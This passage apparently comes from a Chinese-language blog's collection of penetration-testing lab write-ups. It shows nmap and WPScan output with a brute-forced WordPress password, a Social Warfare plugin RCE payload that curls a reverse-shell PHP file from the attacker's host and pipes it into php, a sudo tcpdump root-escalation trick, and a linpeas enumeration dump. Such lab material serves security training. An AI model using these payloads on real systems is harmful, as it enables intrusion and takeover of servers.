http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0\r| Readme - Stable Tag (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt\r| Readme - ChangeLog Section (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt\r[+] Enumerating Config Backups (via Passive and Aggressive Methods)\rChecking Config Backups - Time: 00:00:09 \u0026lt;=========================================\u0026gt; (137 / 137) 100.00% Time: 00:00:09\r[i] No Config Backups Found.\r[+] Performing password attack on Wp Login against 1 user/s\r[SUCCESS] - max / opensesame Trying max / mustafa Time: 00:18:39 \u0026lt; \u0026gt; (5960 / 14350351) 0.04% ETA: ??:??:??\r[!] Valid Combinations Found:\r| Username: max, Password: opensesame\r[!] No WPScan API Token given, as a result vulnerability data has not been output.\r[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\r[+] Finished: Thu May 18 22:21:31 2023\r[+] Requests Done: 6099\r[+] Cached Requests: 42\r[+] Data Sent: 2.118 MB\r[+] Data Received: 34.419 MB\r[+] Memory used: 310.586 MB\r[+] Elapsed time: 00:18:54\r[+] social-warfare存在远程代码执行漏洞，可以在vps上创建txt，payload为\n\u0026lt;pre\u0026gt;phpinfo()\u0026lt;/pre\u0026gt; pre标签里的内容会作为eval()的参数值，也就是我们可以通过控制标签内容达到RCE的效果\n构建payload，curl读取反弹shell的php代码到标准输出，并作为执行\n\u0026lt;pre\u0026gt;system(\u0026#34;curl http://192.168.45.169:5555/eval.php|php\u0026#34;)\u0026lt;/pre\u0026gt; define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; );\r/** MySQL database username */\rdefine( \u0026#39;DB_USER\u0026#39;, \u0026#39;wp_user\u0026#39; );\r/** MySQL database password */\rdefine( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;password\u0026#39; ); ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/sosimple/","summary":"┌──(root💀Chinchin)-[~/桌面/vpn] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.78 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 21:40 CST Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC:","title":""},{"content":"┌──(root㉿kali)-[~]\r└─# nmap -sV -sS -A --min-rate 5000 -p- 192.168.192.88 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 14:18 CST\rNmap scan report for 192.168.192.88\rHost is up (0.21s latency).\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA)\r| 256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA)\r|_ 256 3583682c338bb46c2421200d52edcd16 (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-server-header: Apache/2.4.38 (Debian)\r| http-robots.txt: 1 disallowed entry |_/wp-admin/\r|_http-title: Did not follow redirect to http://sunset-midnight/\r3306/tcp open mysql MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1\r| mysql-info: | Protocol: 10\r| Version: 5.5.5-10.3.22-MariaDB-0+deb10u1\r| Thread ID: 15\r| Capabilities flags: 63486\r| Some Capabilities: Speaks41ProtocolNew, Support41Auth, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, ODBCClient, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults\r| Status: Autocommit\r| Salt: \\~*P8bg`*P3OqkEU\\NS5\r|_ Auth Plugin Name: mysql_native_password\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.93%E=4%D=5/26%OT=22%CT=1%CU=34273%PV=Y%DS=4%DC=T%G=Y%TM=64704F8\rOS:4%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(SP=1\rOS:06%GCD=1%ISR=108%TI=Z%TS=1)OPS(O1=M0ST11NW7%O2=M0ST11NW7%O3=M0NNT11NW7%O\rOS:4=M0ST11NW7%O5=M0ST11NW7%O6=M0ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W\rOS:5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M0NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T\rOS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%\rOS:A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%\rOS:RID=G%RIPCK=G%RUCK=D4AC%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 4 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 554/tcp)\rHOP RTT ADDRESS\r1 205.79 ms 192.168.45.1\r2 205.89 ms 192.168.45.254\r3 205.99 ms 192.168.251.1\r4 206.18 ms 192.168.192.88\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 57.99 seconds wpscan --url http://sunset-midnight/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt 爆破没有得到结果，访问robots.txt User-agent: *\rDisallow: /wp-admin/\rAllow: /wp-admin/admin-ajax.php 访问/wp-admin，查看源代码发现了一些ajax的接口 \u0026lt;script\u0026gt;\rvar spAjax = {\u0026#34;url\u0026#34;:\u0026#34;http:\\/\\/sunset-midnight\\/wp-admin\\/admin-ajax.php\u0026#34;};\r\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#39;http://sunset-midnight/wp-content/plugins/simply-poll-master/script/simplypoll.js?ver=1.4\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script\u0026gt;\rvar _zxcvbnSettings = {\u0026#34;src\u0026#34;:\u0026#34;http:\\/\\/sunset-midnight\\/wp-includes\\/js\\/zxcvbn.min.js\u0026#34;};\r\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#39;http://sunset-midnight/wp-includes/js/zxcvbn-async.min.js?ver=1.0\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script\u0026gt;\rvar pwsL10n = {\u0026#34;unknown\u0026#34;:\u0026#34;Password strength unknown\u0026#34;,\u0026#34;short\u0026#34;:\u0026#34;Very weak\u0026#34;,\u0026#34;bad\u0026#34;:\u0026#34;Weak\u0026#34;,\u0026#34;good\u0026#34;:\u0026#34;Medium\u0026#34;,\u0026#34;strong\u0026#34;:\u0026#34;Strong\u0026#34;,\u0026#34;mismatch\u0026#34;:\u0026#34;Mismatch\u0026#34;};\r\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#39;http://sunset-midnight/wp-admin/js/password-strength-meter.min.js?ver=5.4.2\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#39;http://sunset-midnight/wp-includes/js/underscore.min.js?ver=1.8.3\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script\u0026gt;\rvar _wpUtilSettings = {\u0026#34;ajax\u0026#34;:{\u0026#34;url\u0026#34;:\u0026#34;\\/wp-admin\\/admin-ajax.php\u0026#34;}};\r\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#39;http://sunset-midnight/wp-includes/js/wp-util.min.js?ver=5.4.2\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script\u0026gt;\rvar userProfileL10n = {\u0026#34;warn\u0026#34;:\u0026#34;Your new password has not been saved.\u0026#34;,\u0026#34;warnWeak\u0026#34;:\u0026#34;Confirm use of weak password\u0026#34;,\u0026#34;show\u0026#34;:\u0026#34;Show\u0026#34;,\u0026#34;hide\u0026#34;:\u0026#34;Hide\u0026#34;,\u0026#34;cancel\u0026#34;:\u0026#34;Cancel\u0026#34;,\u0026#34;ariaShow\u0026#34;:\u0026#34;Show password\u0026#34;,\u0026#34;ariaHide\u0026#34;:\u0026#34;Hide password\u0026#34;};\r\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#39;http://sunset-midnight/wp-admin/js/user-profile.min.js?ver=5.4.2\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;div class=\u0026#34;clear\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r尝试构造了请求，但是没有什么收获。看了下walkthrough,发现走的路线不正确，原本想构造接口，看看有没有提供有用信息的接口，但是action参数不管传啥都返回0\n","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/sunsetmidnight/","summary":"┌──(root㉿kali)-[~] └─# nmap -sV -sS -A --min-rate 5000 -p- 192.168.192.88 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 14:18 CST Nmap scan report for 192.168.192.88 Host is up (0.21s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |","title":""},{"content":"","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/untitled-1/","summary":"","title":""},{"content":"","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/untitled-2/","summary":"","title":""},{"content":"","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/untitled/","summary":"","title":""},{"content":"将靶机设置为桥接模式，和其他机器处于一个局域网里。arp-scan -l查看局域网里其他主机，发现VMWARE的描述，确定靶机的IP地址 探测靶机开放的端口，对端口上的服务进行识别（goby会更方便） 80端口的网站是wordpress框架搭建的，用dirb爆破下目录\n/ipdata路径下有个.cap文件，wireshark打开，检索到登录的数据包 用账户密码登录到后台，翻看有啥插件可以利用\n利用file manager查看根目录下的配置文件 拿到了数据库的配置文件，数据库的连接用户名和密码 猜想，他的数据库用户名和密码有可能重复使用，作为SSH服务的账户密码，尝试登录\n登陆成功，但是没有权限访问/root目录\nsudo -l查看所有可以用root权限运行的命令 结合网上教程，新建一个文件， 赋予/root目录所有用户可读写权限 sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z 1 -Z root -Z参数指定使用root用户执行，-z参数指定要执行的命令从文件1中读取\n成功访问/root/flag.txt\n","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/webdeveloper%E9%9D%B6%E6%9C%BA/","summary":"将靶机设置为桥接模式，和其他机器处于一个局域网里。arp-scan -l查看局域网里其他主机，发现VMWARE的描述，确定靶机的IP地址 探测靶","title":""},{"content":"bob@wheels:~$ ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ linpeas v3.1.5 - Safe OSCP by carlospolop ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner\u0026#39;s permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE vector RED: You must take a look at it LightCyan: Users with console Blue: Users without console \u0026amp; mounted devs Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangeta: Your username Starting linpeas. Caching Writable Folders... ════════════════════════════════════╣ Basic information ╠════════════════════════════════════ OS: Linux version 5.4.0-113-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 User \u0026amp; Groups: uid=1000(bob) gid=1000(bob) groups=1000(bob) Hostname: wheels Writable folder: /dev/shm [+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /usr/bin/nc is available for network discover \u0026amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE ════════════════════════════════════╣ System Information ╠════════════════════════════════════ [+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 5.4.0-113-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 Distributor ID: Ubuntu Description: Ubuntu 20.04.4 LTS Release: 20.04 Codename: focal [+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 [+] USBCreator [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation [+] PATH [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin [+] Date Thu 18 May 2023 09:38:15 AM UTC [+] System stats Filesystem Size Used Avail Use% Mounted on udev 445M 0 445M 0% /dev tmpfs 98M 1.2M 97M 2% /run /dev/sda2 9.8G 5.9G 3.4G 64% / tmpfs 489M 0 489M 0% /dev/shm tmpfs 5.0M 0 5.0M 0% /run/lock tmpfs 489M 0 489M 0% /sys/fs/cgroup /dev/loop0 56M 56M 0 100% /snap/core18/2409 /dev/loop4 45M 45M 0 100% /snap/snapd/15904 /dev/loop1 56M 56M 0 100% /snap/core18/2128 /dev/loop2 62M 62M 0 100% /snap/core20/1434 /dev/loop5 45M 45M 0 100% /snap/snapd/15534 /dev/loop6 71M 71M 0 100% /snap/lxd/21029 /dev/loop3 68M 68M 0 100% /snap/lxd/22753 tmpfs 98M 0 98M 0% /run/user/1000 total used free shared buff/cache available Mem: 1000244 279992 85420 3608 634832 527740 Swap: 1994748 3596 1991152 [+] CPU info Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian Address sizes: 45 bits physical, 48 bits virtual CPU(s): 1 On-line CPU(s) list: 0 Thread(s) per core: 1 Core(s) per socket: 1 Socket(s): 1 NUMA node(s): 1 Vendor ID: AuthenticAMD CPU family: 25 Model: 1 Model name: AMD EPYC 7413 24-Core Processor Stepping: 1 CPU MHz: 2649.999 BogoMIPS: 5299.99 Hypervisor vendor: VMware Virtualization type: full L1d cache: 32 KiB L1i cache: 32 KiB L2 cache: 512 KiB L3 cache: 128 MiB NUMA node0 CPU(s): 0 Vulnerability Itlb multihit: Not affected Vulnerability L1tf: Not affected Vulnerability Mds: Not affected Vulnerability Meltdown: Not affected Vulnerability Spec store bypass: Vulnerable Vulnerability Spectre v1: Mitigation; usercopy/swapgs barriers and __user pointer sanitization Vulnerability Spectre v2: Mitigation; Retpolines, IBPB conditional, STIBP disabled, RSB filling Vulnerability Srbds: Not affected Vulnerability Tsx async abort: Not affected Flags: fpu vme de pse tsc msr pae mce cx8 apic sep mtr r pge mca cmov pat pse36 clflush mmx fxsr sse s se2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp l m constant_tsc rep_good nopl tsc_reliable nonst op_tsc cpuid extd_apicid pni pclmulqdq ssse3 fm a cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt a es xsave avx f16c rdrand hypervisor lahf_lm ext apic cr8_legacy abm sse4a misalignsse 3dnowpref etch osvw invpcid_single ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 invpcid rdseed adx smap clf lushopt clwb sha_ni xsaveopt xsavec xgetbv1 xsa ves clzero wbnoinvd arat umip pku ospke vaes vp clmulqdq rdpid overflow_recov succor [+] Environment [i] Any private information inside environment variables? LESSOPEN=| /usr/bin/lesspipe %s HISTFILESIZE=0 USER=bob SSH_CLIENT=192.168.45.156 58180 22 XDG_SESSION_TYPE=tty SHLVL=1 MOTD_SHOWN=pam HOME=/home/bob SSH_TTY=/dev/pts/0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus LOGNAME=bob _=./linpeas.sh XDG_SESSION_CLASS=user TERM=xterm-256color XDG_SESSION_ID=42 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin XDG_RUNTIME_DIR=/run/user/1000 LANG=en_US.UTF-8 HISTSIZE=0 SHELL=/bin/sh LESSCLOSE=/usr/bin/lesspipe %s %s SSH_CONNECTION=192.168.45.156 58180 192.168.195.202 22 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop HISTFILE=/dev/null [+] Searching Signature verification failed in dmseg [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed Not Found [+] AppArmor enabled? .............. You do not have enough privilege to read the profile set. apparmor module is loaded. [+] grsecurity present? ............ grsecurity Not Found [+] PaX bins present? .............. PaX Not Found [+] Execshield enabled? ............ Execshield Not Found [+] SELinux enabled? ............... sestatus Not Found [+] Is ASLR enabled? ............... Yes [+] Printer? ....................... lpstat Not Found [+] Is this a virtual machine? ..... Yes (vmware) [+] Is this a container? ........... No [+] Any running containers? ........ No ═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════ [+] Any sd*/disk* disk in /dev? (limit 20) disk sda sda1 sda2 [+] Unmounted file-system? [i] Check if you can mount umounted devices /dev/disk/by-uuid/a11e5f3b-c0bc-49ee-9ff1-6958065c095d / ext4 defaults 0 0 /swap.img none swap sw 0 0 ════════════════════════════════════╣ Available Software ╠════════════════════════════════════ [+] Useful software /usr/bin/nc /usr/bin/netcat /usr/bin/wget /usr/bin/curl /usr/bin/ping /usr/bin/base64 /usr/bin/socat /usr/bin/python3 /usr/bin/perl /usr/bin/php /usr/bin/sudo /snap/bin/lxc [+] Installed Compiler ══════════════════════════════╣ Processes, Cron, Services, Timers \u0026amp; Sockets ╠════════════════════════════════ [+] Cleaned processes [i] Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes root 665 0.0 0.0 2488 572 ? S May17 0:00 _ bpfilter_umh root 1 0.0 1.2 170288 12696 ? Ss May17 0:02 /sbin/init maybe-ubiquity root 453 0.0 1.8 69676 18176 ? S\u0026lt;s May17 0:05 /lib/systemd/systemd-journald root 487 0.0 0.8 24512 8392 ? Ss May17 0:04 /lib/systemd/systemd-udevd root 26030 0.0 0.5 23972 5568 ? S 09:38 0:00 _ /lib/systemd/systemd-udevd root 26031 0.0 0.5 23972 5568 ? S 09:38 0:00 _ /lib/systemd/systemd-udevd root 26032 0.0 0.6 24512 6096 ? S 09:38 0:00 _ /lib/systemd/systemd-udevd root 26033 0.0 0.6 24512 6096 ? S 09:38 0:00 _ /lib/systemd/systemd-udevd root 26034 0.0 0.6 24512 6096 ? S 09:38 0:00 _ /lib/systemd/systemd-udevd root 619 0.0 1.7 345768 17996 ? SLsl May17 0:10 /sbin/multipathd -d -s systemd+ 657 0.0 0.5 90188 5992 ? Ssl May17 0:02 /lib/systemd/systemd-timesyncd └─(Caps) 0x0000000002000000=cap_sys_time root 682 0.0 1.0 47688 10276 ? Ss May17 0:00 /usr/bin/VGAuthService root 684 0.0 0.8 311636 8248 ? Ssl May17 0:24 /usr/bin/vmtoolsd systemd+ 785 0.0 0.7 26672 7772 ? Ss May17 0:00 /lib/systemd/systemd-networkd └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw systemd+ 798 0.0 1.1 23860 11748 ? Ss May17 0:01 /lib/systemd/systemd-resolved root 868 0.0 0.7 235560 7312 ? Ssl May17 0:01 /usr/lib/accountsservice/accounts-daemon root 872 0.0 0.2 6812 2984 ? Ss May17 0:00 /usr/sbin/cron -f message+ 873 0.0 0.4 7664 4692 ? Ss May17 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only └─(Caps) 0x0000000020000000=cap_audit_write root 881 0.0 1.8 29656 18036 ? Ss May17 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers root 885 0.0 0.6 232712 6640 ? Ssl May17 0:00 /usr/lib/policykit-1/polkitd --no-debug syslog 886 0.0 0.4 224344 4984 ? Ssl May17 0:01 /usr/sbin/rsyslogd -n -iNONE root 888 0.0 3.6 735048 36164 ? Ssl May17 0:02 /usr/lib/snapd/snapd root 890 0.0 0.7 16612 7576 ? Ss May17 0:00 /lib/systemd/systemd-logind root 892 0.0 1.1 392500 11740 ? Ssl May17 0:00 /usr/lib/udisks2/udisksd daemon[0m 895 0.0 0.2 3792 2228 ? Ss May17 0:00 /usr/sbin/atd -f root 960 0.0 0.1 5828 1744 tty1 Ss+ May17 0:00 /sbin/agetty -o -p -- u --noclear tty1 linux mysql 1012 0.0 7.5 1271568 75648 ? Ssl May17 0:10 /usr/sbin/mysqld bob 25262 0.0 0.5 13948 5900 ? S 09:31 0:00 _ sshd: bob@pts/0 bob 25270 0.0 0.1 2608 1696 pts/0 Ss 09:31 0:00 _ -sh bob 25346 0.0 0.9 15796 9704 pts/0 S+ 09:34 0:00 _ python3 -c import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;); bob 25347 0.0 0.5 8176 5116 pts/1 Ss 09:34 0:00 _ /bin/bash bob 25479 0.3 0.2 3084 2144 pts/1 S+ 09:38 0:00 _ /bin/sh ./linpeas.sh bob 26159 0.0 0.0 3084 612 pts/1 S+ 09:38 0:00 _ /bin/sh ./linpeas.sh bob 26163 0.0 0.3 9220 3672 pts/1 R+ 09:38 0:00 | _ ps fauxwww bob 26162 0.0 0.0 3084 612 pts/1 S+ 09:38 0:00 _ /bin/sh ./linpeas.sh root 1020 0.0 1.9 107904 19652 ? Ssl May17 0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal root 1025 0.0 1.0 314456 10384 ? Ssl May17 0:00 /usr/sbin/ModemManager root 1032 0.0 1.8 196360 18656 ? Ss May17 0:01 /usr/sbin/apache2 -k start www-data 21729 0.0 1.5 197120 15596 ? S 07:36 0:00 _ /usr/sbin/apache2 -k start www-data 21730 0.0 1.3 197120 13196 ? S 07:36 0:00 _ /usr/sbin/apache2 -k start www-data 21732 0.0 1.6 197104 16236 ? S 07:36 0:00 _ /usr/sbin/apache2 -k start www-data 21733 0.0 1.5 197112 15772 ? S 07:36 0:00 _ /usr/sbin/apache2 -k start www-data 23470 0.0 1.5 197112 15272 ? S 08:29 0:00 _ /usr/sbin/apache2 -k start www-data 23473 0.0 1.5 197104 15012 ? S 08:29 0:00 _ /usr/sbin/apache2 -k start www-data 23474 0.0 1.5 197112 15192 ? S 08:29 0:00 _ /usr/sbin/apache2 -k start www-data 23475 0.0 1.3 197120 13036 ? S 08:29 0:00 _ /usr/sbin/apache2 -k start www-data 23476 0.0 1.5 197112 15020 ? S 08:29 0:00 _ /usr/sbin/apache2 -k start www-data 23477 0.0 1.2 197104 12976 ? S 08:29 0:00 _ /usr/sbin/apache2 -k start bob 25152 0.0 0.9 18456 9628 ? Ss 09:31 0:00 /lib/systemd/systemd --user bob 25155 0.0 0.4 171504 4476 ? S 09:31 0:00 _ (sd-pam) bob 26105 0.0 0.3 7104 3948 ? Ss 09:38 0:00 _ /usr/bin/dbus-daemon[0m --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only [+] Binary processes permissions [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes 1.2M -rwxr-xr-x 1 root root 1.2M Apr 18 2022 /bin/bash 0 lrwxrwxrwx 1 root root 4 Jul 31 2020 /bin/sh -\u0026gt; dash 1.6M -rwxr-xr-x 1 root root 1.6M Apr 21 2022 /lib/systemd/systemd 160K -rwxr-xr-x 1 root root 159K Apr 21 2022 /lib/systemd/systemd-journald 264K -rwxr-xr-x 1 root root 263K Apr 21 2022 /lib/systemd/systemd-logind 2.2M -rwxr-xr-x 1 root root 2.2M Apr 21 2022 /lib/systemd/systemd-networkd 408K -rwxr-xr-x 1 root root 407K Apr 21 2022 /lib/systemd/systemd-resolved 56K -rwxr-xr-x 1 root root 55K Apr 21 2022 /lib/systemd/systemd-timesyncd 728K -rwxr-xr-x 1 root root 727K Apr 21 2022 /lib/systemd/systemd-udevd 68K -rwxr-xr-x 1 root root 68K Feb 7 2022 /sbin/agetty 0 lrwxrwxrwx 1 root root 20 Apr 21 2022 /sbin/init -\u0026gt; /lib/systemd/systemd 128K -rwxr-xr-x 1 root root 127K Apr 6 2020 /sbin/multipathd 244K -rwxr-xr-x 1 root root 244K Apr 29 2022 /usr/bin/dbus-daemon[0m 0 lrwxrwxrwx 1 root root 9 Mar 13 2020 /usr/bin/python3 -\u0026gt; python3.8 140K -rwxr-xr-x 1 root root 139K Oct 12 2021 /usr/bin/VGAuthService 76K -rwxr-xr-x 1 root root 75K Oct 12 2021 /usr/bin/vmtoolsd 200K -rwxr-xr-x 1 root root 199K Nov 9 2021 /usr/lib/accountsservice/accounts-daemon 120K -rwxr-xr-x 1 root root 119K Feb 21 2022 /usr/lib/policykit-1/polkitd 30M -rwxr-xr-x 1 root root 30M Apr 27 2022 /usr/lib/snapd/snapd 472K -rwxr-xr-x 1 root root 472K Sep 6 2021 /usr/lib/udisks2/udisksd 696K -rwxr-xr-x 1 root root 693K Mar 16 2022 /usr/sbin/apache2 32K -rwxr-xr-x 1 root root 31K Nov 12 2018 /usr/sbin/atd 56K -rwxr-xr-x 1 root root 55K Feb 13 2020 /usr/sbin/cron 1.7M -rwxr-xr-x 1 root root 1.7M Oct 21 2021 /usr/sbin/ModemManager 21M -rwxr-xr-x 1 root root 21M Feb 18 2022 /usr/sbin/mysqld 712K -rwxr-xr-x 1 root root 711K May 3 2022 /usr/sbin/rsyslogd [+] Files opened by processes belonging to other users [i] This is usually empty because of the lack of privileges to read other user processes information COMMAND PID TID TASKCMD USER FD TYPE DEVICE SIZE/OFF NODE NAME [+] Processes with credentials in memory (root req) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory gdm-password Not Found gnome-keyring-daemon Not Found lightdm Not Found vsftpd Not Found apache2 process found (dump creds from memory as root) sshd: process found (dump creds from memory as root) [+] Cron jobs [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found -rw-r--r-- 1 root root 1042 Feb 13 2020 /etc/crontab /etc/cron.d: total 24 drwxr-xr-x 2 root root 4096 May 11 2022 . 